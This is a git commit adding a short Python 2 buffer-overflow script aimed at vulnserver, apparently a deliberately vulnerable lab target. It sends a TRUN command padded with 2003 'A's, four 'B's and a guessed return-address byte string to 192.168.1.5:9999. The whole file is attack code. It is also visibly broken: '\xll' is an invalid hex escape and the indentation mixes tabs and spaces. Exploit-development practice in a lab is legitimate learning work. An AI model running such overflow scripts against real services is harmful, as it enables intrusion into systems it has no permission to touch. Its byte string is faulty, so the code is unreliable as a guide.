11ffa18cf9f0b38d5066f55341dea7f42f4df9a7
Mosaad Sallam <108616378+h0tak88r@users.noreply.github.com>
2023-07-25 03:36:10 +0300

    Create vulnserver_bof_find_the_right_module.py

---
+++ python scripts/BOF/vulnserver_bof_find_the_right_module.py
@@ -0,0 +1,12 @@
+#!/usr/bin/python
+import sys, socket
+
+shellcode="A" * 2003 + "B" * 4 + "\xff\xll\x50\x62"
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('192.168.1.5',9999))
+    s.send(('TRUN.:/' + shellcode))
+	s.close()
+except:
+	print "Error connecting to server "
+	sys.exit()
